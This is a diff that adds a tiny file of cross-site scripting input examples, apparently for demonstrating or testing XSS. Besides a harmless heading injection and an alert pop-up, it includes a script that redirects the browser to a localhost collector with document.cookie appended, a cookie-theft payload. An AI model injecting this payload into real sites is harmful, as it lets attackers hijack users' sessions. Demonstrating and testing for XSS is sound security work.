@@ -1,0 +1,7 @@
+input examples:
+
+<h3> This is basically what xss can do </h3>
+<script type = "text/javascript"> alert("Please check out my site http://fakesite.com"); </script>
+<script type = "text/javascript"> location.href = 'http://localhost/xss.php?cookie=' + document.cookie; </script>
+
+ 
